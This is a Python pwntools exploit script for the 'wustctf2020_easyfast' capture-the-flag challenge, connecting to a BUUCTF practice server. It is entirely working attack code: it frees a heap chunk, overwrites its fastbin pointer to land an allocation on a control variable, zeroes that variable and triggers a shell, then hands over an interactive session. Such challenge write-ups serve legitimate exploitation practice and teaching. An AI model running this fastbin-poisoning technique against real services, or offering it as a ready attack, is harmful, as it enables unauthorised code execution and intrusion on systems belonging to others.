# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'wustctf2020_easyfast'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 0
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 25112)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def add(size):
    p.recvuntil("choice>\n")
    p.sendline("1")
    p.recvuntil("size>\n")
    p.sendline(str(size))

def delete(index):
    p.recvuntil("choice>\n")
    p.sendline("2")
    p.recvuntil("index>\n")
    p.sendline(str(index))

def edit(index, content):
    p.recvuntil("choice>\n")
    p.sendline("3")
    p.recvuntil("index>\n")
    p.sendline(str(index))
    p.sendline(content)

def shell():
    p.recvuntil("choice>\n")
    p.sendline("4")

def pwn():
    switch_addr = 0x602090
    add(0x40)
    add(0x40)
    delete(0)
    edit(0, p64(switch_addr - 0x10))
    # debug(0)
    add(0x40)
    # debug(0)
    add(0x40)
    # debug(0)
    edit(3, p64(0))
    # debug(0)
    # pause()
    shell()
    p.interactive()

if __name__ == '__main__':
    pwn()